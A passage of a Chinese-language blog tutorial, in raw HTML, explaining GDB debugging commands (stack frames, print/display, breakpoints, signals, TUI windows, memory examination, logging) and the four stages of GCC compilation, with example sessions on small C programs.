class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs txt">(gdb) b 3<br>Breakpoint 1 at 0x4004cf: file main.c, line 3.<br>(gdb) r<br>Starting program: ~/demo/main.exe<br><br>Breakpoint 1, func (num=5) at main.c:3<br>3     if(num==1)&#123;<br>(gdb) c<br>Continuing.<br><br>Breakpoint 1, func (num=4) at main.c:3<br>3     if(num==1)&#123;<br>(gdb) p num<br>$1 = 4<br><br>(gdb) backtrace        &lt;-- 打印所有的栈帧信息<br><br>#0  func (num=4) at main.c:3<br>#1  0x00000000004004e9 in func (num=5) at main.c:6<br>#2  0x0000000000400508 in main () at main.c:12<br><br>(gdb) info frame       &lt;-- 打印当前栈帧的详细信息<br><br>Stack level 0, frame at 0x7fffffffe240:            &lt;-- 栈帧编号 0，地址 0x7fffffffe240<br>rip = 0x4004cf in func (main.c:3); saved rip 0x4004e9   &lt;-- 函数的存储地址 0x4004cf，调用它的函数地址为 0x4004e9<br>called by frame at 0x7fffffffe260        &lt;-- 当前栈帧的上一级栈帧（编号 1 的栈帧）的地址为 0x7fffffffe260<br>source language c.<br>Arglist at 0x7fffffffe230, args: num=4  &lt;-- 函数参数的地址和值<br>Locals at 0x7fffffffe230, Previous frame&#x27;s sp is 0x7fffffffe240  &lt;--函数内部局部变量的存储地址<br>Saved registers:    &lt;-- 栈帧内部存储的寄存器<br>  rbp at 0x7fffffffe230, rip at 0x7fffffffe238<br><br>(gdb) info args          &lt;-- 打印当前函数参数的值<br><br>num = 4<br><br>(gdb) info locals        &lt;-- 打印当前函数内部局部变量的信息（这里没有）<br><br>No locals.<br><br>(gdb) up   &lt;-- 查看编号为 1 的栈帧<br><br>#1  0x00000000004004e9 in func (num=5) at main.c:6<br>6         return num*func(num-1);<br><br>(gdb) frame 1           &lt;-- 当编号为 1 的栈帧作为当前栈帧<br><br>#1  0x00000000004004e9 in func (num=5) at main.c:6<br>6         return num*func(num-1);<br><br>(gdb) info frame      &lt;-- 打印 1 号栈帧的详细信息<br><br>Stack level 1, frame at 0x7fffffffe260:<br>rip = 0x4004e9 in func (main.c:6); saved rip 0x400508<br>called by frame at 0x7fffffffe280, caller of frame at 0x7fffffffe240  &lt;--上一级栈帧地址为 0x7fffffffe280，下一级栈帧地址为 0x7fffffffe240<br>source language c.<br>Arglist at 0x7fffffffe250, args: num=5<br>Locals at 0x7fffffffe250, Previous frame&#x27;s sp is 0x7fffffffe260<br>Saved registers:<br>  rbp at 0x7fffffffe250, rip at 0x7fffffffe258<br></code></pre></td></tr></table></figure><ol start="4"><li>GDB中的help命令，注意直接使用help命令显示的是，GDB中的类:<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">aliases -- User-defined aliases of other commands.<br>breakpoints -- Making program stop at certain points.<br>data -- Examining data.<br>files -- Specifying and examining files.<br>internals -- Maintenance commands.<br>obscure -- Obscure features.<br>running -- Running the program.<br>stack -- Examining the stack.<br>status -- Status inquiries.<br></code></pre></td></tr></table></figure></li></ol><p>我们需要使用<code>help class</code>命令来查看这个类的详细信息。</p><ol start="5"><li><code>print</code>命令和<code>display</code>命令的关系：<br>首先<code>print</code>这个命令的作用是显示、<strong>修改</strong>对象的值。但是dispaly只可以显示对象的值，而不可以更改值。不过这个显示值是可以一直显示的。</li></ol><p>具体的：<br><code>print</code>命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> num,result=<span class="hljs-number">0</span>,i=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    <span class="hljs-keyword">while</span>(i&lt;=num)&#123;<br>        result += i;<br>        i++;<br>    &#125;  <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result=%d\n&quot;</span>, result);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调试这个程序：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs txt">[root@bogon demo]# gdb main.exe -q<br>Reading symbols from ~/demo/main.exe...done.<br>(gdb) l<br>1 #include &lt;stdio.h&gt;<br>2 int main()&#123;<br>3     int num,result=0,i=0;<br>4     scanf(&quot;%d&quot;, &amp;num);<br>5     while(i&lt;=num)&#123;<br>6         result += i;<br>7         i++;<br>8     &#125;  <br>9     printf(&quot;result=%d\n&quot;, result);<br>10     return 0;<br>(gdb)<br>11 &#125;<br>(gdb) b 3<br>Breakpoint 1 at 0x40053c: file main.c, line 3.<br>(gdb) r<br>Starting program: /root/demo/main.exe<br><br>Breakpoint 1, main () at main.c:4<br>4     scanf(&quot;%d&quot;, &amp;num);<br>(gdb) n<br>3<br>5     while(i&lt;=num)&#123;<br>(gdb) p num                                 &lt;--输出 num 的值<br>$1 = 3<br>(gdb) p num=4                             &lt;-- 修改 num 的值为 4<br>$2 = 4<br>(gdb) b 9<br>Breakpoint 2 at 0x400569: file main.c, line 9.<br>(gdb) c<br>Continuing.<br><br>Breakpoint 2, main () at main.c:9<br>9     printf(&quot;result=%d\n&quot;, result);<br>(gdb) p result                                 &lt;-- 输出 result 的值<br>$2 = 10<br>(gdb) p result=20                           &lt;-- 修改 result 的值<br>$2 = 20<br>(gdb) c<br>Continuing.<br>result=20<br><br>Program exited normally.<br>(gdb)<br></code></pre></td></tr></table></figure><p><code>display</code>命令：<br>仍然使用上面的程序调试：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs txt">(gdb) b 4<br>Breakpoint 1 at 0x40053c: file main.c, line 4.<br>(gdb) b 9<br>Breakpoint 2 at 0x400569: file main.c, line 9.<br>(gdb) r<br>Starting program: /root/demo/main.exe<br><br>Breakpoint 1, main () at main.c:4<br>4     scanf(&quot;%d&quot;, &amp;num);<br>(gdb) display num<br>1: num = 32767<br>(gdb) display/t result<br>2: /t result = 0<br>(gdb) n<br>3<br>5     while(i&lt;=num)&#123;<br>2: /t result = 0<br>1: num = 3<br>(gdb) c<br>Continuing.<br><br>Breakpoint 2, main () at main.c:9<br>9     printf(&quot;result=%d\n&quot;, result);<br>2: /t result = 110<br>1: num = 3<br>(gdb) c<br>Continuing.<br>result=6<br><br>Program exited normally.<br>(gdb)<br></code></pre></td></tr></table></figure><p>事实上，对于使用 display 命令查看的目标变量或表达式，都会被记录在一张列表（称为<strong>自动显示列表</strong>）中。使用<code>info display</code>可以查看所有<code>displau</code>的对象：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">(gdb) info display<br>Auto-display expressions now in effect:<br>Num Enb Expression<br>2:      y      /t result<br>1:      y      num<br></code></pre></td></tr></table></figure><p>其中，各列的含义为：</p><p>Num 列为各变量或表达式的编号，GDB 调试器为每个变量或表达式都分配有唯一的编号；</p><p>Enb 列表示当前各个变量（表达式）是处于激活状态还是禁用状态，如果处于激活状态（用 y 表示），则每次程序停止执行，该变量的值都会被打印出来；反之，如果处于禁用状态（用 n 表示），则该变量（表达式）的值不会被打印。</p><p>Expression 列：表示查看的变量或表达式。</p><p>取消显示有两个命令：<code>undispaly</code> <code>delete</code>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">undispaly Num 这个是取消显示，不是直接删除<br>enable display num 重新开启<br><br>delete 从直接从删除自动显示列表中删除它<br></code></pre></td></tr></table></figure><ol start="6"><li><code>info</code>和<code>set</code>&amp;<code>unset</code>跟<code>show</code>之间的关系</li></ol><p>info查看程序状态信息。例如断点、寄存器、线程、局部变量等</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">info break 查看断点<br>info signal 查看信号<br>info registers 查看寄存器<br>info all-registers 查看所有寄存器<br>info locals 查看局部变量<br>info signal 查看信号的相关消息<br>info proc 查看当前进程的信息<br>....<br>help info 使用这个命令查看更多信息<br></code></pre></td></tr></table></figure><p>show查看 gdb 配置信息。与 info 不同， show 查看 GDB 本身的配置信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">show args 查看程序的参数<br></code></pre></td></tr></table></figure><p>set    设置变量值。有时指定变量类型才能设置，如 <code>set *(int*)(&amp;a) = 3</code>，还可以配置程序的环境如：环境变脸、参数。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">set args 1 2 设置程序的两个参数为 1 2<br>set env DEBUG 设置程序的环境变量<br></code></pre></td></tr></table></figure><ol start="7"><li><p>线程切换命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">thread n <span class="hljs-comment">#将线程切换为n号线程</span><br></code></pre></td></tr></table></figure></li><li><p>发送信号的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">signal 9 <span class="hljs-comment">#发送信号9</span><br>signal SIGKILL <span class="hljs-comment">#发送直接杀死信号</span><br></code></pre></td></tr></table></figure></li><li><p><code>whatis</code>命令和<code>ptype</code>命令之间的关系：<br>首先需要明确的是，这两个命令都是查看对象的类型的命令，只是ptype相当于whatis命令更加详细，会给出结构体的定义，而whatis不会。其他都一致。</p></li><li><p>直接退出当前函数不执行剩下的代码：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">return <br></code></pre></td></tr></table></figure></li><li><p><code>disable</code>命令和<code>enable</code>命令；</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">disable 1 2 关闭断点1 2<br>enable 1 打开断点1<br><br>上面都是需要断点号，通过info breakpoint<br><br>info break 来查看断点的相关信息<br><br>关于enable命令：<br>enable [breakpoints] [num...]                        激活用 num... 参数指定的多个断点，如果不设定 num...，表示激活所有禁用的断点<br>enable [breakpoints] once num…                 临时激活以 num... 为编号的多个断点，但断点只能使用 1 次，之后会自动回到禁用状态<br>enable [breakpoints] count num...      临时激活以 num... 为编号的多个断点，断点可以使用 count 次，之后进入禁用状态<br>enable [breakpoints] delete num…               激活 num.. 为编号的多个断点，但断点只能使用 1 次，之后会被永久删除。<br></code></pre></td></tr></table></figure></li><li><p>信号的处理配置</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">使用info signal SIGINT <br>Signal        Stop      Print   Pass to program Description<br>SIGINT        Yes       Yes     No              Interrupt<br><br>以上各列的含义是：<br>Signal：各个信号的名称；<br>Stop：当信号发生时，是否终止程序执行。Yes 表示终止，No 表示当信号发生时程序认可继续执行；<br>Print：当信号发生时，是否要求 GDB 打印出一条提示信息。Yes 表示打印，No 表示不打印；<br>Pass：当信号发生时，该信号是否对程序可见。Yes 表示程序可以捕捉到该信息，No 表示程序不会捕捉到该信息；<br>Description：对信号所表示含义的简单描述。<br><br><br>使用下面的命令配置：<br><br>handle signal mode <br><br>mode是：<br>nostop：当信号发生时，GDB 不会暂停程序，其可以继续执行，但会打印出一条提示信息，告诉我们信号已经发生；<br>stop：当信号发生时，GDB 会暂停程序执行。<br>noprint：当信号发生时，GDB 不会打印出任何提示信息；<br>print：当信号发生时，GDB 会打印出必要的提示信息；<br>nopass（或者 ignore）：GDB 捕获目标信号的同时，不允许程序自行处理该信号；<br>pass（或者 noignore）：GDB 调试在捕获目标信号的同时，也允许程序自动处理该信号。<br></code></pre></td></tr></table></figure></li><li><p>edit命令<br>这个命令可以允许在GDB中修改程序的源代码，但是非常不好用，我也不会用。</p></li><li><p>search命令<br>搜索命令，可以快速搜索函数名</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">search &lt;regexp&gt;<br>reverse-search &lt;regexp&gt;<br><br>第一项命令格式表示从当前行的开始向前搜索，后一项表示从当前行开始向后搜索。其中 regexp 就是正则表达式，正则表达式描述了一种字符串匹配的模式，可以用来检查一个串中是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串。很多的编程语言都支持使用正则表达式。<br><br></code></pre></td></tr></table></figure></li><li><p>GDB窗口命令<br>使用命令：layout 打开gdb的图形化窗口，help layout快速查看选项</p></li></ol><ul><li>窗口大小的改变<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将代码窗口的高度扩大 5 行代码</span><br>winheight src + 5<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将代码窗口的高度减小 4 代码</span><br>winheight src - 4<br><br><br>ctrl l #刷新窗口<br>Ctrl + L：刷新窗口<br>Ctrl + x，再按1：单窗口模式，显示一个窗口<br>Ctrl + x，再按2：双窗口模式，显示两个窗口<br>Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。<br></code></pre></td></tr></table></figure></li><li>窗口焦点切换</li></ul><p>在默认设置下，方向键和 PageUp&#x2F;PageDown 都是用来控制 GDB TUI 的 src 窗口的，所以如果想要使用方向键控制输入的命令，就必须先<code>focus cmd</code></p><p><strong>显示前一条命令和后一条命令的功能：<code>Ctrl + N/Ctrl + P </code></strong></p><p>注意：通过方向键调整了GDB TUI 的 src 窗口以后，可以用 update 命令重新把焦点定位到当前执行的代码上。</p><p>focus 命令调整焦点位置<br>默认情况下焦点是在 src 窗口，通过 focus next 命令可以把焦点移到 cmd 窗口，这时候就可以像以前一样，通过方向键来切换上一条命令和下一条命令。</p><p>使用 focus prev 切回到源码窗口，如果焦点不在 src 窗口，我们就不必使用方向键来浏览源码了。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312211725139.png"></p><ol><li><p><code>attach</code>命令</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">等效于-p gdb -p 1111 使用于还没进入gdb之前<br><br>不同的是<br>attach 1111 是使用于进入了gdb <br></code></pre></td></tr></table></figure></li><li><p>gdb调试指定源代码、调试符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#gdb指定具有调试符号的库</span><br>show debug-file-directory <span class="hljs-comment">#可以查看调试库的默认位置，默认就是/usr/lib/debug/</span><br><span class="hljs-built_in">set</span> debug-file-directory /usr/lib/debug/<br><br><span class="hljs-comment">#指定源代码目录</span><br>directory /home/ysc/open_sources_code/glibc-2.35 <span class="hljs-comment">#其中directory可以简写为dir</span><br></code></pre></td></tr></table></figure></li><li><p>gdb调试如何查看#define</p></li></ol><p><a href="https://blog.csdn.net/wojiuguowei/article/details/82259782?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">https://blog.csdn.net/wojiuguowei/article/details/82259782?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g3 -gdwarf-2或者是-gdwarf-(1-5)最好是5<br></code></pre></td></tr></table></figure><ol start="19"><li><p>注意以<code>i</code>结尾的命令并不是打断点，单汇编指令执行如：<code>nexti</code> <code>starti</code></p></li><li><p>查看内存上的值：<br><br>常使用这个命令查看栈空间。<br>特别需要注意的是在小端序上，显示的值是需要从右往左读：</p><pre><code class="hljs">0xa0  0x92  0x55  0x55  0x55  0x55  0x00  0x00</code></pre></li></ol><p>需要右往左读：0x00 00 55 55 55 55 90 a0</p><p><strong>需要注意的一件事是，这里堆地址以 0x5555 开头，栈地址以 0x7fffff 开头。 所以很容易区分栈上的地址和堆上的地址之间的区别。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#格式</span><br>x/NFU ADDRESS <br><span class="hljs-comment">#参数说明：</span><br>N:重复次数<br>F:格式，在后面有写<br>U:单位，右面有写<br></code></pre></td></tr></table></figure><p>F:格式</p><pre><code class="hljs">u:显示为无符号十进制数o:显示为八进制数t:two 显示为二进制数a:地址c:显示为asciif:浮点数s:显示为字符串i:显示机械语言x:十六进制</code></pre><p>U:单位</p><pre><code class="hljs">b:字节h:半字（两个字节）w:字（四字节）g:双字</code></pre><p>特殊用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x/ls string <span class="hljs-comment">#查看string中的值</span><br></code></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>如果<code>x $rsi</code>报错：<code>Cannot access memory at address xxx</code>则说明这个寄存器中存储的不是地址而是一个值, 此时使用<code>p $rsi</code>即可.</li></ul><ol start="21"><li><p>生成内存转储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">generate-core-file<br><span class="hljs-comment">#或</span><br>gcore命令可以直接从命令行生成内核转储文件<br></code></pre></td></tr></table></figure></li><li><p>查看gdb的历史操作以及输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">set</span> trace-commands on<br><span class="hljs-built_in">set</span> logging on<br></code></pre></td></tr></table></figure><p>此时再在gdb中运行命令，会在启动gdb时所在路径处建立<code>gdb.txt</code>文件。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tail -f gdb.txt<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>Tips : 在gdb.txt中，调试命令前的 (gdb)提示符变成了+，使得命令与输出更加难以区分。 可以执行命令，使得+号高亮</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tail -f gdb.txt | perl -pe <span class="hljs-string">&#x27;s/(\+)/\e[1;31m$1\e[0m/g&#x27;</span><br></code></pre></td></tr></table></figure><p>此命令使+号变为红色，若需要改成其他颜色，可查看man console_codes</p>          </div><ol start="23"><li><p>如何快速查看程序的退出原因</p><ol><li>直接执行 <code>c</code></li><li><code>info program</code>这个指令可以直接查看程序退出的原因</li><li>使用<code>info stack</code>查看退出函数的调用栈</li><li>使用<code>info registers</code>查看退出时寄存器中的值</li></ol></li><li><p>改善gdb的输出的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> object on: 当打印指向对象的指针时，显示其真实类型<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> array on: 用更好的格式打印数组，但是需要占用更多空间<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> pretty on: 打印结构体/类时使用缩进<br></code></pre></td></tr></table></figure></li><li><p>关于查看源代码<br>使用<code>list</code>命令或者是<code>l</code>来查看源代码，后面可以跟上需要查看的行号。需要注意的是在默认情况下<code>list</code>命令会输出<code>10</code>行代码，如果想要进行更改需要：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> listsize 20 <span class="hljs-comment"># 将一次输出的函数更改为20行，</span><br><span class="hljs-built_in">set</span> listsize unlimited <span class="hljs-comment"># 无限制</span><br></code></pre></td></tr></table></figure><p>其他使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">l 1,20 <span class="hljs-comment"># 查看1到20行的代码</span><br>l 1.c:10 <span class="hljs-comment"># 查看1.c文件的第10行附近的10行代码</span><br>l 1.c:10,1.c20 <span class="hljs-comment"># 指定文件来查看行数</span><br></code></pre></td></tr></table></figure></li><li><p>我们调试的使用常常会有修改代码的需求, 其实gdb是支持不退出程序修改的. 使用命令<code>edit</code>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">edit 32         <span class="hljs-comment"># 编辑当前文件的32行</span><br><br>edit main       <span class="hljs-comment"># 编辑当前文件的main函数</span><br><br>edit main.c:init  <span class="hljs-comment"># 编辑main.c中的init函数</span><br><br>edit mian.c:32   <span class="hljs-comment"># 编辑main.c中的32行</span><br><br>shell gcc -g -lpthread -o 29-1 ./29-1.c <span class="hljs-comment"># 在修改了源代码之后需要重新编译, 需要注意的是如果没有重新编译代码, 直接使用l命令查看源代码, 显示的还是没有更改过的代码.</span><br></code></pre></td></tr></table></figure></li><li><p>直接更改寄存器中的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> var <span class="hljs-variable">$pc</span>=0x08050949<br></code></pre></td></tr></table></figure></li><li><p>带参数调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 方法一</span><br>gdb --args a.out qq bb<br><span class="hljs-comment"># 方法二</span><br>gdb ./a.out<br>run qq bb<br><span class="hljs-comment"># 方法三</span><br>gdb ./a.out<br><span class="hljs-built_in">set</span> args qq bb<br><br><br>show args <span class="hljs-comment"># 显示参数</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="编译步骤"><a href="#编译步骤" class="headerlink" title="编译步骤"></a>编译步骤</h2><p>实质上从<code>hello.c</code>源代码到<code>hello</code>或<code>a.out</code>可执行文件，GCC 的编译过程大致经历了下面 4 个步骤：</p><p><a href="http://www.uinio.com/Linux/GCC/gcc-compilation-process.png"><img src="http://www.uinio.com/Linux/GCC/gcc-compilation-process.png"></a></p><ul><li><strong>预处理</strong>：C 编译器对各种预处理命令进行处理，包括头文件包含、宏定义的扩展、条件编译的选择等（_使用<code>gcc -E</code>_）；</li></ul><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>➜  gcc -E main.c -o main.i</span><br><span>➜  <span>ls</span></span><br><span>main.c  main.i</span><br></pre></td></tr></tbody></table><ul><li><strong>编译</strong>：对预处理得到的源代码文件进行翻译转换，产生由机器语言描述的<strong>汇编文件</strong>（_使用<code>gcc -S</code>_）；</li></ul><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>➜  gcc -S main.i</span><br><span>➜  <span>ls</span></span><br><span>main.c  main.i  main.s</span><br></pre></td></tr></tbody></table><ul><li><strong>汇编</strong>：将汇编代码转译成为<strong>机器码</strong>（_使用<code>gcc -c</code>_）；</li></ul><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>➜  gcc -c main.s</span><br><span>➜  <span>ls</span></span><br><span>main.c  main.i  main.s  main.o</span><br></pre></td></tr></tbody></table><ul><li><strong>链接</strong>：将机器码中的各种符号引用与定义转换为<strong>可执行文件</strong>中的相应信息（例如虚拟地址）；</li></ul><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>➜  gcc main.o -o main</span><br><span>➜  <span>ls</span></span><br><span>main.c  main.i  main.o  main.s  main</span><br></pre></td></tr></tbody></table><p>为了便于查找，下表列出了编译和链接 C&#x2F;C++ 